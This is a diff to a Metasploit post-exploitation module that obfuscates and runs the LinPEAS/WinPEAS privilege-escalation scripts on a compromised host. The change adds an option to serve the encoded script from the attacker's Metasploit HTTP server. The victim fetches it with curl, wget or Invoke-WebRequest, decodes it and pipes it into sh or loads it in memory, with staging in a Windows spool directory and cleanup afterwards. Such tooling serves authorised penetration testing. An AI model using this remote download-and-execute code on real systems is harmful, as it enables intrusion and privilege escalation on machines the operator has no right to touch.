@@ -11,6 +11,7 @@ require 'tempfile'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::File
+  include Msf::Exploit::Remote::HttpServer
 
   def initialize(info={})
     super( update_info(info,
@@ -18,6 +19,8 @@ class MetasploitModule < Msf::Post
       'Description'    => %q{
           This module will launch the indicated PEASS (Privilege Escalation Awesome Script Suite) script to enumerate the system.
           You need to indicate the URL or local path to LinPEAS if you are in some Unix or to WinPEAS if you are in Windows.
+          By default this script will upload the PEASS script to the host (encrypted and/or encoded) and will load, deobfuscate, and execute it.
+          You can configure this module to download the encrypted/encoded PEASS script from this metasploit instance via HTTP instead of uploading it.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
@@ -34,12 +37,18 @@ class MetasploitModule < Msf::Post
     ))
     register_options(
       [
-        OptString.new('URL', [true, 'Path to the PEASS script. Accepted: http(s):// URL or absolute local path. Linpeas: https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh', "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASany.exe"]),
+        OptString.new('PEASS_URL', [true, 'Path to the PEASS script. Accepted: http(s):// URL or absolute local path. Linpeas: https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh', "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASany.exe"]),
         OptString.new('PASSWORD', [false, 'Password to encrypt and obfuscate the script (randomly generated). The length must be 32B. If no password is set, only base64 will be used.', rand(36**32).to_s(36)]),
-        OptString.new('TEMP_DIR', [false, 'Path to upload the obfuscated PEASS script. By default "C:\Windows\System32\spool\drivers\color" is used in Windows and "/tmp" in Unix.', '']),
+        OptString.new('TEMP_DIR', [false, 'Path to upload the obfuscated PEASS script inside the compromised machine. By default "C:\Windows\System32\spool\drivers\color" is used in Windows and "/tmp" in Unix.', '']),
         OptString.new('PARAMETERS', [false, 'Parameters to pass to the script', nil]),
-        OptString.new('TIMEOUT', [false, 'Timeout of the execution of the PEASS script (15min by default)', 15*60])
+        OptString.new('TIMEOUT', [false, 'Timeout of the execution of the PEASS script (15min by default)', 15*60]),
+        OptString.new('SRVHOST', [false, 'Set your metasploit instance IP if you want to download the PEASS script from here via http(s) instead of uploading it.', '']),
+        OptString.new('SRVPORT', [false, 'Port to download the PEASS script from using http(s) (only used if SRVHOST)', 443]),
+        OptString.new('SSL', [false, 'Indicate if you want to communicate with https (only used if SRVHOST)', true]),
+        OptString.new('URIPATH', [false, 'URI path to download the script from there (only used if SRVHOST)', "/" + rand(36**4).to_s(36) + ".txt"])
       ])
+    
+    @temp_file_path = ""
   end
 
   def run
@@ -87,8 +96,8 @@ class MetasploitModule < Msf::Post
     else
       # If no Windows, check if base64 exists
       if !session.platform.include?("win")
-        openssl_path = cmd_exec("command -v base64")
-        raise 'base64 not found in victim, set a 32B length password!' unless openssl_path.include?("base64")
+        base64_path = cmd_exec("command -v base64")
+        raise 'base64 not found in victim, set a 32B length password!' unless base64_path.include?("base64")
       end
 
       # Encode PEASS script
@@ -100,31 +109,71 @@ class MetasploitModule < Msf::Post
       load_winpeas = "$#{rand(36**6).to_s(36)} = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($#{ps_var1}));"
     
     end
-
+    
     # Write obfuscated PEASS to a local file
     file = Tempfile.new('peass_metasploit')
     file.write(peass_script_64)
     file.rewind
+    @temp_file_path = file.path
 
-    # Upload file to victim
-    temp_peass_name = rand(36**5).to_s(36)
-    if datastore["TEMP_DIR"] != ""
-      temp_path = datastore["TEMP_DIR"]
-      if temp_path[0] == "/"
-        temp_path = temp_path + "/#{temp_peass_name}"
+    if datastore["SRVHOST"] == ""
+      # Upload file to victim
+      temp_peass_name = rand(36**5).to_s(36)
+      if datastore["TEMP_DIR"] != ""
+        temp_path = datastore["TEMP_DIR"]
+        if temp_path[0] == "/"
+          temp_path = temp_path + "/#{temp_peass_name}"
+        else
+          temp_path = temp_path + "\\#{temp_peass_name}"
+        end
+      
+      elsif session.platform.include?("win")
+        temp_path = "C:\\Windows\\System32\\spool\\drivers\\color\\#{temp_peass_name}"
       else
-        temp_path = temp_path + "\\#{temp_peass_name}"
+        temp_path = "/tmp/#{temp_peass_name}"
       end
-    
-    elsif session.platform.include?("win")
-      temp_path = "C:\\Windows\\System32\\spool\\drivers\\color\\#{temp_peass_name}"
+      
+      print_status("Uploading obfuscated peass to #{temp_path}...")
+      upload_file(temp_path, file.path)
+      print_good("Uploaded")
+
+      #Start the cmd, prepare to read from the uploaded file
+      if session.platform.include?("win")
+        cmd = "$ProgressPreference = 'SilentlyContinue'; $#{ps_var1} = Get-Content -Path #{temp_path};"
+        last_cmd += "del #{temp_path};"
+      else
+        cmd = "cat #{temp_path}"
+        last_cmd = "rm #{temp_path}"
+      end
+
+    # Instead of writting the file to disk, download it from HTTP
     else
-      temp_path = "/tmp/#{temp_peass_name}"
+      last_cmd = ""
+      # Start HTTP server
+      start_service()
+
+      http_protocol = datastore["SSL"] ? "https://" : "http://"
+      http_ip = datastore["SRVHOST"]
+      http_port = ":#{datastore['SRVPORT']}"
+      http_path = datastore["URIPATH"]
+      url_download_peass = http_protocol + http_ip + http_port + http_path      
+      print_good("Listening in #{url_download_peass}")
+      
+      # Configure the download of the scrip in Windows
+      if session.platform.include?("win")
+        cmd = "$ProgressPreference = 'SilentlyContinue'; $#{ps_var1} = Invoke-WebRequest \"#{url_download_peass}\" -UseBasicParsing | Select-Object -ExpandProperty Content;"
+      
+      # Configure the download of the scrip in unix
+      else
+        cmd = "curl -s \"#{url_download_peass}\""
+        curl_path = cmd_exec("command -v curl")
+        if ! curl_path.include?("curl")
+          cmd = "wget -q -O - \"#{url_download_peass}\""
+          wget_path = cmd_exec("command -v weget")
+          raise 'Neither curl nor wget were found in victim, unset the SRVHOST option!' unless wget_path.include?("wget")
+        end
+      end
     end
-    
-    print_status("Uploading obfuscated peass to #{temp_path}...")
-    upload_file(temp_path, file.path)
-    print_good("Uploaded")
     
     # Run PEASS script
     begin
@@ -133,11 +182,9 @@ class MetasploitModule < Msf::Post
 
       # If Windows, suppose Winpeas was loaded
       if session.platform.include?("win")
-        cmd = "$#{ps_var1} = Get-Content -Path #{temp_path};"
         cmd += load_winpeas
         cmd += "$a = [winPEAS.Program]::Main(\"#{datastore['PARAMETERS']}\");"
-        cmd += "del #{temp_path};"
-        
+        cmd += last_cmd
         # Transform to Base64 in UTF-16LE format
         cmd_utf16le = cmd.encode("utf-16le")
         cmd_utf16le_b64 = Base64.encode64(cmd_utf16le).gsub(/\r?\n/, "")
@@ -145,7 +192,10 @@ class MetasploitModule < Msf::Post
       
         # If unix, then, suppose linpeas was loaded
       else
-        tmpout << cmd_exec("cat #{temp_path} | #{decode_linpeass_cmd} | sh -s -- #{datastore['PARAMETERS']}; rm #{temp_path}", args=nil, time_out=datastore["TIMEOUT"])
+        cmd += "| #{decode_linpeass_cmd}"
+        cmd += "| sh -s -- #{datastore['PARAMETERS']}"
+        cmd += last_cmd
+        tmpout << cmd_exec(cmd, args=nil, time_out=datastore["TIMEOUT"])
       end
 
       print "\n#{tmpout}\n\n"
@@ -161,10 +211,16 @@ class MetasploitModule < Msf::Post
     file.unlink
   end
 
+  def on_request_uri(cli, request)
+    print_status("HTTP request received")
+    send_response(cli, File.open(@temp_file_path).read, {'Content-Type'=>'text/plain'})
+    print_good("PEASS script sent")
+  end
+
   def load_peass
     # Load the PEASS script from a local file or from Internet
     peass_script = ""
-    url_peass = datastore['URL']
+    url_peass = datastore['PEASS_URL']
     
     if url_peass.include?("http://") || url_peass.include?("https://")
       target = URI.parse url_peass
